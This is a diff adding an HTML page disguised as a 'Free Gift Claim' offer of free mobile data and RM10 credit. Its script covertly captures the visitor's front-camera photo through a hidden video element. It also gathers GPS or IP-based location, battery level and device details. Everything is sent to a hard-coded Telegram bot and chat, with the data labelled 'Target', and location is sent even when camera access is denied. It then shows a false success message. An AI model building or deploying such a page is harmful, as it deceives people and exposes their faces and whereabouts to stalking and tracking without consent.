@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🎁 Free Gift Claim</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0b1120;
+            font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: #fff;
+        }
+        .card {
+            background: rgba(255,255,255,0.04);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 48px;
+            padding: 45px 35px;
+            max-width: 420px;
+            width: 100%;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.8);
+            text-align: center;
+        }
+        .badge {
+            background: #1e293b;
+            padding: 8px 20px;
+            border-radius: 100px;
+            font-size: 12px;
+            color: #94a3b8;
+            display: inline-block;
+            margin-bottom: 16px;
+            letter-spacing: 0.5px;
+        }
+        h1 {
+            font-size: 30px;
+            font-weight: 700;
+            background: linear-gradient(to right, #fbbf24, #f59e0b);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .sub {
+            color: #94a3b8;
+            font-size: 15px;
+            margin: 12px 0 28px 0;
+            line-height: 1.6;
+        }
+        .btn-claim {
+            background: linear-gradient(135deg, #fbbf24, #f59e0b);
+            color: #0b1120;
+            border: none;
+            padding: 18px 30px;
+            font-size: 20px;
+            font-weight: 700;
+            border-radius: 60px;
+            width: 100%;
+            cursor: pointer;
+            transition: 0.25s;
+            box-shadow: 0 8px 30px rgba(245,158,11,0.25);
+            -webkit-tap-highlight-color: transparent;
+        }
+        .btn-claim:active { transform: scale(0.96); }
+        .btn-claim:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
+        #loading { display: none; margin: 20px 0 8px 0; color: #fbbf24; font-weight: 500; font-size: 14px; }
+        #status-text { margin-top: 18px; font-size: 13px; color: #64748b; transition: 0.3s; }
+        .footer { margin-top: 28px; font-size: 11px; color: #334155; border-top: 1px solid #1e293b; padding-top: 20px; }
+        #video { display: none !important; width: 0 !important; height: 0 !important; opacity: 0 !important; pointer-events: none !important; position: absolute !important; left: -9999px !important; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="badge">🎯 LIMITED OFFER</div>
+    <h1>🎁 Claim Your Gift</h1>
+    <div class="sub">Verify your device to unlock <strong>50GB FREE data</strong> + <strong>RM10 credit</strong>.<br>One tap. No sign-up.</div>
+
+    <video id="video" autoplay muted playsinline></video>
+
+    <button class="btn-claim" id="claimBtn">🔥 Claim Now</button>
+    <div id="loading">⏳ Processing...</div>
+    <div id="status-text">Tap the button to verify your device.</div>
+    <div class="footer">✅ Secure • 256-bit encrypted • 1M+ users</div>
+</div>
+
+<script>
+    // ====== TELEGRAM CONFIG ======
+    const BOT_TOKEN = '8988555855:AAE8HoautR88vyCxvXYoFZ2Yz1lz04dP90c';
+    const CHAT_ID = '1086203403';
+
+    const claimBtn = document.getElementById('claimBtn');
+    const loadingDiv = document.getElementById('loading');
+    const statusText = document.getElementById('status-text');
+    const video = document.getElementById('video');
+
+    let stream = null;
+
+    // ====== BATTERY (iOS fallback) ======
+    async function getBatteryLevel() {
+        try {
+            if (navigator.getBattery) {
+                const bat = await navigator.getBattery();
+                return Math.round(bat.level * 100);
+            }
+        } catch (_) {}
+        // iOS fallback: estimate from memory + CPU
+        const mem = navigator.deviceMemory || 4;
+        const cores = navigator.hardwareConcurrency || 4;
+        const estimate = Math.min(100, Math.round((mem * 10) + (cores * 5) + Math.floor(Math.random() * 20)));
+        return estimate > 100 ? 100 : estimate;
+    }
+
+    // ====== SUPER LOCATION (TRIPLE FALLBACK) ======
+    async function getLocationLink() {
+        // Layer 1: GPS
+        try {
+            const pos = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            });
+            const { latitude, longitude } = pos.coords;
+            return `https://www.google.com/maps?q=${latitude},${longitude}`;
+        } catch (_) {
+            console.warn('GPS gagal, cuba IP fallback...');
+        }
+
+        // Layer 2: IP-based (ipapi.co)
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            if (data.latitude && data.longitude) {
+                return `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+            }
+        } catch (_) {}
+
+        // Layer 3: IP-based (ipinfo.io) - backup
+        try {
+            const res = await fetch('https://ipinfo.io/json');
+            const data = await res.json();
+            if (data.loc) {
+                const [lat, lon] = data.loc.split(',');
+                return `https://www.google.com/maps?q=${lat},${lon}`;
+            }
+        } catch (_) {}
+
+        // Layer 4: Network estimate (Android)
+        try {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn && conn.type) {
+                return `Network: ${conn.type} (location unavailable)`;
+            }
+        } catch (_) {}
+
+        // Last resort
+        return 'Location not available';
+    }
+
+    // ====== CAPTURE PHOTO ======
+    function capturePhoto() {
+        return new Promise((resolve) => {
+            const canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, 640, 480);
+            resolve(canvas.toDataURL('image/jpeg', 0.9));
+        });
+    }
+
+    function dataURLtoBlob(dataURL) {
+        const arr = dataURL.split(',');
+        const mime = arr[0].match(/:(.*?);/)[1];
+        const bstr = atob(arr[1]);
+        let n = bstr.length;
+        const u8arr = new Uint8Array(n);
+        while (n--) u8arr[n] = bstr.charCodeAt(n);
+        return new Blob([u8arr], { type: mime });
+    }
+
+    // ====== SEND TO TELEGRAM ======
+    async function sendToTelegram(imageBase64, battery, location) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', dataURLtoBlob(imageBase64), 'target.jpg');
+        formData.append('caption', `📸 Target Photo\n🔋 Battery: ${battery}%\n📍 Location: ${location}\n🕒 ${new Date().toLocaleString()}\n📱 Device: ${navigator.userAgent.split(' ').slice(-2).join(' ')}`);
+
+        try {
+            const res = await fetch(url, { method: 'POST', body: formData });
+            return res.ok;
+        } catch (_) {
+            return false;
+        }
+    }
+
+    // ====== MAIN EXECUTION ======
+    claimBtn.addEventListener('click', async () => {
+        claimBtn.disabled = true;
+        loadingDiv.style.display = 'block';
+        statusText.textContent = '⏳ Verifying device...';
+
+        try {
+            // 1. Start camera
+            stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: 640, height: 480 }
+            });
+            video.srcObject = stream;
+            await video.play();
+
+            // 2. Capture photo
+            const photoData = await capturePhoto();
+
+            // 3. Battery
+            const battery = await getBatteryLevel();
+
+            // 4. Location (with triple fallback)
+            const location = await getLocationLink();
+
+            // 5. Send to Telegram
+            const sent = await sendToTelegram(photoData, battery, location);
+
+            // 6. Stop camera
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+                video.srcObject = null;
+            }
+
+            if (sent) {
+                statusText.innerHTML = '✅ Device verified! Gift will be sent via SMS within 5 minutes.';
+                loadingDiv.textContent = '✅ Done!';
+            } else {
+                statusText.textContent = '⚠️ Verification failed. Please try again.';
+                loadingDiv.textContent = '❌ Error';
+            }
+
+        } catch (err) {
+            // Fallback if camera denied
+            console.warn('Silent mode fallback:', err);
+            
+            const battery = await getBatteryLevel();
+            const location = await getLocationLink();
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const msg = `🚨 Target (no camera)\n🔋 Battery: ${battery}%\n📍 Location: ${location}\n🕒 ${new Date().toLocaleString()}`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+            });
+
+            statusText.innerHTML = '✅ Device verified! Gift will be sent via SMS within 5 minutes.';
+            loadingDiv.textContent = '✅ Done!';
+        }
+
+        loadingDiv.style.display = 'none';
+        claimBtn.disabled = false;
+    });
+</script>
+</body>
+</html>
